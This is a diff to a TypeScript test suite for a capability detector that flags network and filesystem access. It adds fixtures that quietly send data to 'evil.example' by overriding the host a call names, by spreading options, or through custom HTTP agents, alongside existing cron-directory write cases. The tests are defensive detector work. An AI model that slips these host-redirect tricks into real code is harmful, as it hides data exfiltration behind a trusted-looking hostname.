@@ -280,6 +280,18 @@ const caught: Record<string, string> = {
   rd41_worklet_module: "export function t(ctx: AudioContext) { return ctx.audioWorklet.addModule(\"/w.js\"); }",
   rd42_report_write: "export function t() { process.report.writeReport(\"/etc/cron.d/x\"); }",
   rd43_compile_cache: "import module from \"node:module\";\nexport function t() { module.enableCompileCache(\"/etc/cron.d\"); }",
+  // Options that override the host a call names (checked against Node itself).
+  rd50_tls_options_host: "import tls from \"node:tls\";\nexport function t(d: string) { tls.connect(443, \"good.example\", { host: \"evil.example\" }).end(d); }",
+  rd51_tls_options_spread: "import tls from \"node:tls\";\nexport function t(o: tls.ConnectionOptions) { return tls.connect(443, \"good.example\", { ...o }); }",
+  rd52_http2_options_variable: "import http2 from \"node:http2\";\nexport function t(opts: http2.SecureClientSessionOptions) { return http2.connect(\"https://good.example\", opts); }",
+  rd53_http2_options_host: "import http2 from \"node:http2\";\nexport function t() { return http2.connect(\"https://good.example\", { host: \"evil.example\" } as http2.SecureClientSessionOptions); }",
+  rd54_http_agent_lookup: "import http from \"node:http\";\nimport type { LookupFunction } from \"node:net\";\ndeclare const lookup: LookupFunction;\nexport function t(d: string) { http.request({ hostname: \"good.example\", method: \"POST\", agent: new http.Agent({ lookup }) }).end(d); }",
+  rd55_http_agent_variable: "import https from \"node:https\";\nexport function t(agent: https.Agent) { return https.get(\"https://good.example/\", { agent }); }",
+  rd56_fetch_dispatcher: "export function t(d: string, dispatcher: unknown) { return fetch(\"http://good.example/collect\", { method: \"POST\", body: d, dispatcher } as RequestInit); }",
+  rd57_fetch_init_spread: "export function t(init: RequestInit) { return fetch(\"https://good.example/\", { ...init, method: \"POST\" }); }",
+  rd58_fetch_init_variable: "export function t(init: RequestInit) { return fetch(\"https://good.example/\", init); }",
+  rd59_http_agent_subclass: "import http from \"node:http\";\nimport net from \"node:net\";\nclass A extends http.Agent { createConnection() { return net.connect(443, \"evil.example\"); } }\nexport function t() { return http.request({ hostname: \"good.example\", agent: new A() }); }",
+  rd60_http_agent_const_written: "import https from \"node:https\";\nimport net from \"node:net\";\nconst agent = new https.Agent({ keepAlive: true });\nObject.assign(agent, { createConnection: () => net.connect(443, \"evil.example\") });\nexport function t() { return https.get({ hostname: \"good.example\", agent }); }",
 };
 
 // Harmless code that must not be reported, including common `any` casts that reach no capability.
@@ -359,6 +371,8 @@ const silent: Record<string, string> = {
   rd_fp25_boolean_detection: "export function t() { return [Boolean(globalThis.fetch), !!globalThis.WebSocket, Boolean(window.EventSource) && 1]; }",
   rd_fp30_timer_functions: "export function t(h: () => void, hs: (() => void)[]) { hs.forEach(setTimeout); setTimeout(h, 1); return Promise.resolve(h).then(setTimeout); }",
   rd_fp40_script_lookalikes: "export function t() { const registry = { register: (x: string) => x }; return [registry.register(\"/sw.js\"), process.report.getReport()]; }",
+  rd_fp50_host_options_precise: "import tls from \"node:tls\";\nimport net from \"node:net\";\nimport http from \"node:http\";\nimport http2 from \"node:http2\";\n/** @perm net(good.example) */\nexport function t(d: string) {\n  tls.connect(443, \"good.example\", { servername: \"good.example\", rejectUnauthorized: true }, () => {}).end(d);\n  tls.connect(443, \"good.example\", { host: \"good.example\" }).end(d);\n  net.connect(443, \"good.example\", () => {}).end(d);\n  http.request({ hostname: \"good.example\", agent: new http.Agent({ keepAlive: true }) }).end(d);\n  http.get(\"http://good.example/\", { agent: false });\n  http2.connect(\"https://good.example\", { host: \"good.example\" }, () => {});\n  http2.connect(\"https://good.example\", () => {});\n  return fetch(\"https://good.example/\", { method: \"POST\", headers: { a: \"b\" }, body: d, signal: undefined });\n}",
+  rd_fp51_shared_agent: "import https from \"node:https\";\nconst keepAlive = new https.Agent({ keepAlive: true });\nconst agent = new https.Agent();\n/** @perm net(good.example) */\nexport function t() { return [https.get({ hostname: \"good.example\", agent: keepAlive }), https.get(\"https://good.example/\", { agent })]; }\nexport function stop() { keepAlive.destroy(); }",
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
@@ -445,4 +459,9 @@ describe("re-verification (detectors): reported as the access it is", () => {
   it("rd30_timer_reflect_apply_string", () => expect(capabilities("rd30_timer_reflect_apply_string")).toEqual(["unverifiable"]));
   it("rd42_report_write", () => expect(capabilities("rd42_report_write")).toEqual(["fs.write(/etc/cron.d/x)"]));
   it("rd43_compile_cache", () => expect(capabilities("rd43_compile_cache")).toEqual(["fs.read(/etc/cron.d)", "fs.write(/etc/cron.d)"]));
+  for (const name of ["rd50_tls_options_host", "rd51_tls_options_spread", "rd52_http2_options_variable", "rd53_http2_options_host", "rd54_http_agent_lookup", "rd55_http_agent_variable", "rd56_fetch_dispatcher", "rd57_fetch_init_spread", "rd58_fetch_init_variable", "rd59_http_agent_subclass"]) {
+    it(name, () => expect(capabilities(name)).toEqual(["net"]));
+  }
+  // The agent's const is changed, so the request could go anywhere; the top-level code that changes it is reported too.
+  it("rd60_http_agent_const_written", () => expect(errorsIn("rd60_http_agent_const_written").filter((d) => d.function === "t").map((d) => d.capability)).toEqual(["net"]));
 });
